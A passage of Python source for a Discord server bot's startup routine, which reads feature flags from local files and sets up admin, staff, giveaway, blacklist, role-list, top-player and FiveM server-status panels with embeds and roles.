                    embed.add_field(name=f"Top #{number}", value=f"``{number}.`` **{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
            number = int(number)
        cchannelt = discord.utils.get(guild.channels, id=claimchannel)
        if cchannelt is not None:
            await cchannelt.purge()
            global claims
            claims = await cchannelt.send(embed=embed)

    # activity SYSTEM STARTING ........................
    global activity_system
    activitysystem = open("systems\\activity\\eactivity.txt", "r")
    activity_system = activitysystem.read()
    if activity_system == "true":
        activity = discord.Activity(type=discord.ActivityType.playing, name=f'Members: 👥 {guild.member_count} Developer Lmao4745')
        await bot.change_presence(activity=activity)
        await asyncio.sleep(2)
        print(Fore.GREEN + "Activity loaded" + Fore.WHITE)
    if activity_system == "false":
        print(Fore.RED + "Activity System is Disabled" + Fore.WHITE)




    # PANEL SYSTEM STARTING ........................
    panelsystem = open("systems\\panel_server\\epanel.txt", "r")
    panel_system = panelsystem.read()
    if panel_system == "true":
        channel_name = "〈📡〉panel-server"
        test_channel = discord.utils.get(guild.channels, name=channel_name)
        if test_channel:
            await test_channel.purge()
            embed=discord.Embed(title="Bot description", description="**All the commands and options you can do\nWarning The software works on everyone who has the bot turned on on his computer**", color=colorembed)
            embed.add_field(name="Bot Commands", value="```diff\n- Bot Commands Prefix (!)\n+ Bot Developer = Lmao4745\n\nBasic Commands\n+ ch [password]  Change storage password\n\nServer Locking Commands\n+ ls  Lock The Server\n+ unls  Unlock The Server```", inline=True)
            embed.set_author(name=f"{servername} Panel Bot", icon_url=f"{servericon}")
            await test_channel.send(embed=embed, view=Bt())

        if not test_channel:
            panel = await guild.create_text_channel(name=channel_name)
            await panel.set_permissions(guild.default_role, read_messages=False, send_messages=False)
            channel_name = "〈📡〉panel-server"
            test_channel = discord.utils.get(guild.channels, name=channel_name)
            embed=discord.Embed(title="Bot description", description="**All the commands and options you can do\nWarning The software works on everyone who has the bot turned on on his computer**", color=0x00ff00)
            embed.add_field(name="Bot Commands", value="```diff\n- Bot Commands Prefix (!)\n+ Bot Developer = Lmao4745\n\nBasic Commands\n+ ch [password]  Change storage password\n\nServer Locking Commands\n+ ls  Lock The Server\n+ unls  Unlock The Server```", inline=True)
            embed.set_author(name=f"{servername} Panel Bot", icon_url=f"{servericon}")
            await test_channel.send(embed=embed, view=Bt())
            
            role_name = "〈📡〉Panel Permission"
            role_panel = discord.utils.get(guild.roles, name=role_name)
            if role_panel:
                return
            if not role_panel:
                role1 = await guild.create_role(name=role_name)
                role_panel = discord.utils.get(guild.roles, name=role_name)
                await role1.edit(colour=0x29ff00)
                await panel.set_permissions(role1, read_messages=True, send_messages=True)
        print(Fore.GREEN + "Panel loaded" + Fore.WHITE)
    if panel_system == "false":
        print(Fore.RED + "Panel System is Disabled" + Fore.WHITE)



    # GETROLE SYSTEM STARTING ........................
    if getroles_system == "true":
        channel_name = "〈🎁〉get-roles"
        embed=discord.Embed(title="Get Roles", description="**🎁 To get the role you want, click the appropriate button**", color=0x4fff00)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        try:
            getroles_channel = open(f"systems\\getroles\\channel.txt", "r")
            getroles_channell = int(getroles_channel.read())
            getroles_channel.close()
            channelgetroles = discord.utils.get(guild.channels, id=getroles_channell)
            await channelgetroles.purge()
            await channelgetroles.send(embed=embed, view=getroles())
        except:
            channelgetroles = discord.utils.get(guild.channels, name=channel_name)
            if channelgetroles:
                await channelgetroles.purge()
                await channelgetroles.send(embed=embed, view=getroles())
            if not channelgetroles:
                await guild.create_text_channel(name=channel_name)
                channelgetroles = discord.utils.get(guild.channels, name=channel_name)
                await channelgetroles.set_permissions(guild.default_role, read_messages=False, send_messages=False, view_channel=False)
                await channelgetroles.send(embed=embed, view=getroles())
        print(Fore.GREEN + "Get Roles loaded" + Fore.WHITE)
    if getroles_system == "false":
        print(Fore.RED + "Get Roles System is Disabled" + Fore.WHITE)


    """if os.path.exists("systems\\backup\\true.txt"):
        image_path = "emojis\\2011-private.png"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        secpanel = discord.utils.get(guild.channels, name="〈🌐〉backup-panel")
        if secpanel:
            await secpanel.purge()
            embeds=discord.Embed(title=f"🌐 Server backup panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__A server backup panel gives you the option to back up your server at any time and basically keep that there was no unpleasant situation__**", color=0x00ff89)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await secpanel.send(embed=embeds, view=backupsys())
            print(f"{Fore.LIGHTCYAN_EX}Backup Panel exists {Fore.WHITE}")
        if not secpanel:
            secpanel = await guild.create_text_channel(name="〈🌐〉backup-panel", category=categorylogss)
            await secpanel.set_permissions(guild.default_role, view_channel=False)
            embeds=discord.Embed(title=f"🌐 Server backup panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__A server backup panel gives you the option to back up your server at any time and basically keep that there was no unpleasant situation__**", color=0x00ff89)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await secpanel.send(embed=embeds, view=backupsys())
            print(f"{Fore.LIGHTCYAN_EX}Backup Panel Created {Fore.WHITE}")
    else:
        print(Fore.RED + "Backup System is Disabled" + Fore.WHITE)"""


    if os.path.exists("systems\\messagepanel\\true.txt"):
        image_path = "emojis\\6172-discord-forum-private-white.png"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        messagepanel = discord.utils.get(guild.channels, name="〈✨〉message-panel")
        if messagepanel:
            await messagepanel.purge()
            embeds=discord.Embed(title=f"✨ Server Message Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__The messaging system provides you with the ability to manage messages in a more organized and less restrictive manner__**", color=0xff0000)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await messagepanel.send(embed=embeds, view=messagepanell())
            print(f"{Fore.LIGHTCYAN_EX}Message Panel exists {Fore.WHITE}")
        if not messagepanel:
            messagepanel = await guild.create_text_channel(name="〈✨〉message-panel", category=categorylogss)
            await messagepanel.set_permissions(guild.default_role, view_channel=False)
            embeds=discord.Embed(title=f"✨ Server Message Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__The messaging system provides you with the ability to manage messages in a more organized and less restrictive manner__**", color=0xff0000)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await messagepanel.send(embed=embeds, view=messagepanell())
            print(f"{Fore.LIGHTCYAN_EX}Message Panel Created {Fore.WHITE}")
    else:
        print(Fore.RED + "Message System is Disabled" + Fore.WHITE)

    if os.path.exists("systems\\security\\true.txt"):
        image_path = "emojis\\2011-private.png"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        secpanel = discord.utils.get(guild.channels, name="〈👤〉security-panel")
        if secpanel:
            await secpanel.purge()
            embeds=discord.Embed(title=f"👤 Security Administrator Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__Panel Management Security and Protection Secrets__**", color=0x00ff89)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await secpanel.send(embed=embeds, view=membersec())
            print(f"{Fore.LIGHTCYAN_EX}Security Panel exists {Fore.WHITE}")
        if not secpanel:
            secpanel = await guild.create_text_channel(name="〈👤〉security-panel", category=categorylogss)
            await secpanel.set_permissions(guild.default_role, view_channel=False)
            embeds=discord.Embed(title=f"👤 Security Administrator Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__Panel Management Security and Protection Secrets__**", color=0x00ff89)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await secpanel.send(embed=embeds, view=membersec())
            print(f"{Fore.LIGHTCYAN_EX}Security Panel Created {Fore.WHITE}")



    # FIVEMSYSTEM IS START ........................
    try:
        if fivemsystems == "true":
            global fivemsystemips
            global fivemsystemipps
            global fivemchannelid
            fivemsystemip = open("systems\\fivemsystem\\ip.txt", "r")
            fivemsystemips = fivemsystemip.read()
            fivemsystemipp = open("systems\\fivemsystem\\port.txt", "r")
            fivemsystemipps = int(fivemsystemipp.read())
            fivemchannel1 = open("systems\\fivemsystem\\channelid.txt", "r")
            fivemchannelid = int(fivemchannel1.read())
            fivem=fivem_client.Client(f"{fivemsystemips}", fivemsystemipps)
            fivemsystemip.close()
            fivemsystemipp.close()
            fivemchannel = discord.utils.get(guild.channels, id=fivemchannelid)
            await fivemchannel.purge()
            fivemslot = await fivem.get_current_slot()
            fivemplayers = await fivem.get_players_count()
            username = await fivem.get_players_info()
            if fivemslot is not None or username is not None:
                embed=discord.Embed(title="Fivem Server Stats", description=f"**Information About The Fivem Server\n\n〈🖥️〉server ip: {fivemsystemips}\n〈👤〉Server Players {fivemplayers}\\{fivemslot}\n〈🟢〉Server is Online\n\nPlayer List**\n", color=colorembed)
                text = "g"
                for users in username:
                    fivemfor = f"[ID: {users.id}]   ``{users.name}``  **<@{users.discordid}>**      **Ping: {users.ping}**\n"
                    embed.description += fivemfor
                    text += "true"
                if text == "g":
                    fivemfor = ""
                    fivemfor += "**There are no players connected to the server**"
                    embed.description += fivemfor
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            else:
                embed=discord.Embed(title="Fivem Server Stats", description=f"**Information About The Fivem Server\n\n〈🖥️〉server ip: {fivemsystemips}\n〈🔴〉Server is Offline**", color=colorembed)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            global fivemchannelmessage
            fivemchannelmessage = None
            fivemchannelmessage = await fivemchannel.send(embed=embed)
            fivemchannel1.close()
            print(Fore.GREEN + "Fivem System loaded" + Fore.WHITE)
            live_status.start()
        if fivemsystems == "false":
            print(Fore.RED + "Fivem System is Disabled" + Fore.WHITE)
    except:
        if fivemchannel is not None:
            fivemchannelmessage = await fivemchannel.send(embed=embed)
            print(Fore.GREEN + "FivemSystem loaded" + Fore.WHITE)
        if fivemchannel is None:
            print(f"{Fore.LIGHTYELLOW_EX}Fivem Channel is not configuerd{Fore.WHITE}")


    if os.path.exists("emojisids\\giveaway.txt"):
        f = open("emojisids\\giveaway.txt", "r")
        emojigiveawayu = f.read()
        f.close()
    if not os.path.exists("emojisids\\giveaway.txt"):
        file_path = "emojis\\2659-tada-purple.gif"
        MOIE = "giveaway"
        with open(file_path, 'rb') as file:
            emoji_bytes = file.read()
            file.close()

        emoji_data = {
            'name': MOIE,
            'image': emoji_bytes
        }
        emojigiveawayu = discord.utils.get(guild.emojis, name=MOIE)
        if not emojigiveawayu:
            await guild.create_custom_emoji(**emoji_data)

        emojigiveawayu = discord.utils.get(guild.emojis, name=MOIE)
        emoji = emojigiveawayu
        f = open(f"emojisids\\giveaway.txt", "w")
        f.write(f"{emoji}")
        f.close()



    if giveawayem == "true":
        image_path = "emojis\\4861-gift.png"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        channelg = discord.utils.get(guild.channels, name="〈🎉〉giveaway-host")
        if channelg:
            pass
        if not channelg:
            await guild.create_text_channel(name="〈🎉〉giveaway-host", category=categorylogss)
            channelg = discord.utils.get(guild.channels, name="〈🎉〉giveaway-host")
            await channelg.set_permissions(guild.default_role, view_channel=False, send_messages=False)
        embed=discord.Embed(title=f"Server Giveaway Panel | {guild.name}", description=f"{emojigiveawayu}** __Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__The lottery system for creating and ending lotteries (control panel)__**", color=0x0013ff)
        embed.set_thumbnail(url=f"{image_link}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        await channelg.purge()
        giveawayrole = discord.utils.get(guild.roles, name="〈🎉〉Giveaway Host")
        if not giveawayrole:
            await guild.create_role(name="〈🎉〉Giveaway Host")
            print(f"{Fore.LIGHTCYAN_EX}Giveaway Role is Created{Fore.WHITE}")
        if giveawayrole:
            print(f"{Fore.LIGHTCYAN_EX}Giveaway Role is Exists{Fore.WHITE}")
        global giveawaypermrole
        giveawaypermrole = discord.utils.get(guild.roles, name="〈🎉〉Giveaway Host")
        try:
            await channelg.send(embed=embed, view=Giveawaya())
        except:
            pass
        print(Fore.GREEN + "Giveaway loaded" + Fore.WHITE)
    if giveawayem == "false":
        print(Fore.RED + "Giveaway System is Disabled" + Fore.WHITE)




    AdminPanel = open("systems\\Adminpanel\\eadminpanel.txt", "r")
    AdminPanelr = AdminPanel.read()
    AdminPanel.close()
    if AdminPanelr == "true":
        #page --------------------------------------------
        image_path = "emojis\\staff.gif"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        #------------------------------------------------------
        achannel = discord.utils.get(guild.channels, name="〈✏〉admin-panel")
        if achannel:
            pass
        if not achannel:
            channela =  await guild.create_text_channel(name="〈✏〉admin-panel", category=categorylogss)
            await channela.set_permissions(guild.default_role, view_channel=False, send_messages=False)
        achannel = discord.utils.get(guild.channels, name="〈✏〉admin-panel")
        embed=discord.Embed(title=f"✨ Development Administrator Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__The admin control panel on the server and most of the things on the server__**", color=0xcc00ff)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{image_link}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        await achannel.purge()
        await achannel.send(embed=embed, view=AdminPanel1())
        print(Fore.GREEN + "Adminpanel loaded" + Fore.WHITE)
    if AdminPanelr == "false":
        print(Fore.RED + "Adminpanel System is Disabled" + Fore.WHITE)




    staffteame = open("systems\\staffteam-panel\\staffteam-panel.txt", "r")
    staffteamem = staffteame.read()
    staffteame.close()
    if staffteamem == "true":
        achannel = discord.utils.get(guild.channels, name="〈📚〉staff-team-panel")
        if achannel:
            pass
        if not achannel:
            channela =  await guild.create_text_channel(name="〈📚〉staff-team-panel", category=categorylogss)
            await channela.set_permissions(guild.default_role, view_channel=False, send_messages=False)
        #page --------------------------------------------
        image_path = "emojis\\7596-certified-moderator-animated.gif"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        #------------------------------------------------------
        achannel = discord.utils.get(guild.channels, name="〈📚〉staff-team-panel")
        embed=discord.Embed(title=f"✨ Server Staff Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__This staff panel allows the staff to warn people and do more things. access to the other staff tools | Staff Only__**", color=0x32f9ff)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=image_link)
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        await achannel.purge()
        await achannel.send(embed=embed, view=staffteampanel())
        print(Fore.GREEN + "Staff Team Panel loaded" + Fore.WHITE)
    if staffteamem == "false":
        print(Fore.RED + "Staff Panel System is Disabled" + Fore.WHITE)


    numberfolders = 1
    for folders in os.listdir("systems\\rolelist"):
        numberfolders = str(numberfolders)
        rolelist1 = open(f"systems\\rolelist\\rolelist{numberfolders}\\rolelist.txt", "r")
        rolelistt1 = rolelist1.read()
        rolelist1.close()
        if rolelistt1 == "true":
            crolelist = open(f"systems\\rolelist\\rolelist{numberfolders}\\crolelist.txt", "r")
            crolelistt = int(crolelist.read())
            crolelist.close()
            title = open(f"systems\\rolelist\\rolelist{numberfolders}\\title.txt", "r", encoding="utf-8")
            titlee = title.read()
            title.close()
            des = open(f"systems\\rolelist\\rolelist{numberfolders}\\description.txt", "r", encoding="utf-8")
            dess = des.read()
            des.close()
            embedcolorr = open(f"systems\\rolelist\\rolelist{numberfolders}\\embedcolor.txt", "r")
            embedcolor = embedcolorr.read()
            embedcolorr.close()
            embedcolorread = int(embedcolor, 16)
            embed=discord.Embed(title=f"{titlee}", description=f"**{dess}**", color=embedcolorread)
            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embed.set_thumbnail(url=f"{servericon}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            numberl = 1
            for folder in os.listdir(f"systems\\rolelist\\rolelist{numberfolders}\\rolelist"):
                numberl = str(numberl)
                if folder == f"rolelist{numberl}":
                    p = f"systems\\rolelist\\rolelist{numberfolders}\\rolelist\\rolelist{numberl}"
                    rrolelist = open(f"{p}\\rolelist{numberl}.txt", "r")
                    rrolelistt = rrolelist.read()
                    rrolelist.close()
                    if rrolelistt == "true":
                        name = open(f"{p}\\name.txt", "r", encoding="utf-8")
                        namen = name.read()
                        name.close()
                        roleid = open(f"{p}\\roleid.txt", "r")
                        roleidd = int(roleid.read())
                        roleid.close()
                        status = open(f"{p}\\st.txt", "r")
                        statuss = status.read()
                        status.close()
                        rolelistrole = discord.utils.get(guild.roles, id=roleidd)
                        field = ""
                        try:
                            if statuss == "1":
                                for member in rolelistrole.members:
                                    field += f"``{member.name}#{member.discriminator}``\n"
                                members = len(rolelistrole.members)
                                field += f"**Total Members:** ``{members}`` **RoleName:** ``{rolelistrole.name}``"
                                embed.add_field(name=f"{namen}", value=f"{field}", inline=False)
                            if statuss == "2":
                                for member in rolelistrole.members:
                                    field += f"{member.mention}\n"
                                members = len(rolelistrole.members)
                                field += f"**Total Members:** ``{members}`` **RoleName:** ``{rolelistrole.name}``"
                                embed.add_field(name=f"{namen}", value=f"{field}", inline=False)
                        except:
                            pass
                numberl = int(numberl)
                numberl += 1
            rolelistchannel = discord.utils.get(guild.channels, id=crolelistt)
            await rolelistchannel.purge()
            await rolelistchannel.send(embed=embed)
            try:
                rolelistloop1.start()
            except:
                pass
            numberfolders = int(numberfolders)
            numberfolders += 1
    print(Fore.GREEN + "RoleList loaded" + Fore.WHITE)


    #New Update
    if os.path.exists("systems\\blacklist\\true.txt"):
        image_path = "emojis\\staff.gif"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        messageurl = await Imagem.send(file=image_attachment)
        image_link = messageurl.attachments[0].url
        blacklistc = discord.utils.get(guild.channels, name="〈⚫〉blacklist-panel")
        if blacklistc:
            await blacklistc.purge()
            embeds=discord.Embed(title=f"⚫️ Server BlackList Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__This admin panel lets you add users to the server's blacklist__**", color=0x020000)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await blacklistc.send(embed=embeds, view=bblacklists())
            print(f"{Fore.LIGHTCYAN_EX}BlackList Panel exists {Fore.WHITE}")
        if not blacklistc:
            blacklistc = await guild.create_text_channel(name="〈⚫〉blacklist-panel", category=categorylogss)
            await blacklistc.set_permissions(guild.default_role, view_channel=False)
            embeds=discord.Embed(title=f"⚫️ Server BlackList Panel | {guild.name}", description=f"**__Server information__**\n**Server Name:** ``{guild.name}``\n**Server ID:** ``{guild.id}``\n**Bot Developer:** ``Lmao4745``\n**__This admin panel lets you add users to the server's blacklist__**", color=0x020000)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{image_link}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await blacklistc.send(embed=embeds, view=bblacklists())
            print(f"{Fore.LIGHTCYAN_EX}BlackList Panel Created {Fore.WHITE}")
        blacklistr = discord.utils.get(guild.roles, name="〈⚫️〉BlackList Manager")
        if not blacklistr:
            blacklist = await guild.create_role(name="〈⚫️〉BlackList Manager")
            await blacklist.edit(colour=0x020000)
            print(f"{Fore.LIGHTCYAN_EX}BlackList Manager Role is Created{Fore.WHITE}")
        if blacklistr:
            print(f"{Fore.LIGHTCYAN_EX}BlackList Manager Role is Exists{Fore.WHITE}")
        blacklistr = discord.utils.get(guild.roles, name="〈⚫️〉BlackList")
        if not blacklistr:
            blacklist = await guild.create_role(name="〈⚫️〉BlackList")
            await blacklist.edit(colour=0x020000)
            print(f"{Fore.LIGHTCYAN_EX}BlackList Role is Created{Fore.WHITE}")
        if blacklistr:
            print(f"{Fore.LIGHTCYAN_EX}BlackList Role is Exists{Fore.WHITE}")
    else:
        print(Fore.RED + "BlackList System is Disabled" + Fore.WHITE)
        





    if giveawayem == "true":
        pg = "systems\\giveaways\\giveaways"
        for file in os.listdir(f"systems\\giveaways\\giveaways"):
            try:
                f = open(f"{pg}\\{file}\\name.txt", "r", encoding="utf-8")
                gname = f.read()
                f.close()
                with open(f"{pg}\\{file}\\des.txt", 'r', encoding="utf-8") as f:
                    gdes = f.read()
                f = open(f"{pg}\\{file}\\winners.txt", "r")
                gwinners = f.read()
                f.close()
                f = open(f"{pg}\\{file}\\channel.txt", "r")
                gchannel = int(f.read())
                f.close()
                giveawayschannel = discord.utils.get(guild.channels, id=gchannel)
                number = 0
                for listm in os.listdir(f"{pg}\\{file}\\list"):
                    number += 1
                giveawayembed=discord.Embed(title=f"〈🎉〉Giveaway {gname}", timestamp=datetime.now(), description=f"``{gdes}``", color=0x00ffa5)
                giveawayembed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                giveawayembed.add_field(name=f"Members in Giveaway:", value=f"``{number}``", inline=True)
                giveawayembed.add_field(name=f"Winners:", value=f"``{gwinners}``", inline=True)
                giveawayembed.set_thumbnail(url=f"{servericon}")
                giveawayembed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                message = await giveawayschannel.send(embed=giveawayembed, view=Give())
                f = open(f"{pg}\\{file}\\giveawaymsgid.txt", "w")
                f.write(f"{message.id}")
                f.close()
            except:
                print("The lottery fails to load")
    if giveawayem != "true":
        pass




    f = open("systems\\staff-forms\\lock.txt", "r")
    staffformsr = f.read()
    f.close()
    if staffformsr == "true":
        try:
            f = open("systems\\staff-forms\\message.txt", "r")
            msg = f.read()
            f.close()
            f = open("systems\\staff-forms\\channel.txt", "r")
            channelmsg = int(f.read())
            f.close()
            f = open("systems\\staff-forms\\user.txt", "r")
            usersf = f.read()
            f.close()
            sfchannel = discord.utils.get(guild.channels, id=channelmsg)
            embed=discord.Embed(title=f"**〈📕〉Staff Forms**", description=f"**Staff Forms Update\n@everyone**", color=0xff0000)
            embed.add_field(name=f"〈📖〉Staff Forms", value=f"**The forms for the Staff are now open and you are are welcome to submit them.**", inline=True)
            embed.add_field(name=f"〈📄〉{usersf} Message", value=f"**{msg}**", inline=True)
            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embed.set_thumbnail(url=f"{servericon}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await sfchannel.purge()
            await sfchannel.send(embed=embed, view=staffforms())
        except:
            pass






    if os.path.exists(f"systems\\TopPlayers\\true.txt"):
        Hours = ""
        days = ""
        week = ""
        discordin = ""
        getchannelsplayerlist = discord.utils.get(guild.channels, id=channelspla)
        num_folders = 10

        main_folder_path = "systems\\TopPlayers\\list"

        folders_data = []

        for folder_name in os.listdir(main_folder_path):
            folder_path = os.path.join(main_folder_path, folder_name)
            if os.path.isdir(folder_path):
                hours_file_path = os.path.join(folder_path, "hours.txt")
                days_file_path = os.path.join(folder_path, "days.txt")
                weeks_file_path = os.path.join(folder_path, "week.txt")

                if os.path.isfile(hours_file_path) and os.path.isfile(days_file_path) and os.path.isfile(weeks_file_path):
                    with open(hours_file_path) as hours_file, open(days_file_path) as days_file, open(weeks_file_path) as weeks_file:
                        hours_sum = sum(int(line) for line in hours_file)
                        days_sum = sum(int(line) for line in days_file)
                        weeks_sum = sum(int(line) for line in weeks_file)
                        total_sum = (weeks_sum * 7 * 24) + (days_sum * 24) + hours_sum
                        folders_data.append((folder_name, total_sum, hours_sum, days_sum, weeks_sum))
        sorted_folders = sorted(folders_data, key=lambda x: x[1], reverse=True)

        top_folders = sorted_folders[:num_folders]
        embed=discord.Embed(title=f"〈🏆〉Top 10 Players", description=f"**The most active players with the most hours in the server**", color=colorembed)
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        for i, folder in enumerate(top_folders, 1):
            folder_name, total_sum, hours_sum, days_sum, weeks_sum = folder
            member = guild.get_member(int(folder_name))
            #print("Position:", i)
            #print("Folder:", folder_name)
            #print("Total Sum:", total_sum)
            #print("Hours:", hours_sum)
            #print("Days:", days_sum)
            #print("Weeks:", weeks_sum)
            Hours += f"``{hours_sum} Hour(s), {days_sum} Day(s)``\n"
            week += f"``{weeks_sum} Week(s)``\n"
            if member is not None:
                if i == 1:
                    discordin += f"``🥇.`` **{member.mention}**\n"
                if i == 2:
                    discordin += f"``🥈.`` **{member.mention}**\n"
                if i == 3:
                    discordin += f"``🥉.`` **{member.mention}**\n"
                if i != 1 and i != 2 and i != 3:
                    discordin += f"``{i}.`` **{member.mention}**\n"
            if member is None:
                if i == 1:
                    discordin += f"``🥇.`` **None**\n"
                if i == 2:
                    discordin += f"``🥈.`` **None**\n"
                if i == 3:
                    discordin += f"``🥉.`` **None**\n"
                if i != 1 and i != 2 and i != 3:
                    discordin += f"``{i}.`` **None**\n"
        embed.add_field(name=f"Discord info:", value=f"{discordin}", inline=True)
        embed.add_field(name=f"Hour(s)/Day(s):", value=f"{Hours}", inline=True)
        embed.add_field(name=f"Week(s):", value=f"{week}", inline=True)
        await getchannelsplayerlist.purge()
        await getchannelsplayerlist.send(embed=embed)
        print(Fore.GREEN + "Top 10 Players loaded" + Fore.WHITE)
        try:
            topplayerss.start()
        except:
            pass
        try:
            topplayers.start()
        except:
            pass
    if not os.path.exists(f"systems\\TopPlayers\\true.txt"):
        print(Fore.RED + "Top 10 Players System is Disabled" + Fore.WHITE)





#    if os.path.exists("systems\\ChannelStats\\true.txt"):
#        category = discord.utils.get(guild.categories, name='📡 • General Stats')
#
#        if category is None:
#            category = await guild.create_category('📡 • General Stats')
#        for stats in os.listdir(f"systems\\ChannelStats\\list"):
#            f = open(f"systems\\ChannelStats\\list\\{stats}\\name.txt", "r")
#            sname = f.read()
#            f.close()
#            f = open(f"systems\\ChannelStats\\list\\{stats}\\emoji.txt", "r", encoding="utf-8")
#            semoji = f.read()
#            f.close()
#            f = open(f"systems\\ChannelStats\\list\\{stats}\\roleid.txt", "r")
#            srole = int(f.read())
#            f.close()





    if os.path.exists("emojisids\\mod.txt"):
        f = open("emojisids\\mod.txt", "r")
        emojimodu = f.read()
        f.close()
    if not os.path.exists("emojisids\\mod.txt"):
        file_path = "emojis\\5191-moderatorbadge.png"
        MOIE = "moderationoptionsem"
        with open(file_path, 'rb') as file:
            emoji_bytes = file.read()
            file.close()

        emoji_data = {
            'name': MOIE,
            'image': emoji_bytes
        }
        emojimodd = discord.utils.get(guild.emojis, name=MOIE)
        if not emojimodd:
            await guild.create_custom_emoji(**emoji_data)

        emojimodu = discord.utils.get(guild.emojis, name=MOIE)
        emoji = emojimodu
        f = open(f"emojisids\\mod.txt", "w")
        f.write(f"{emoji}")
        f.close()

    if os.path.exists("systems\\CustomUI\\verify.txt"):
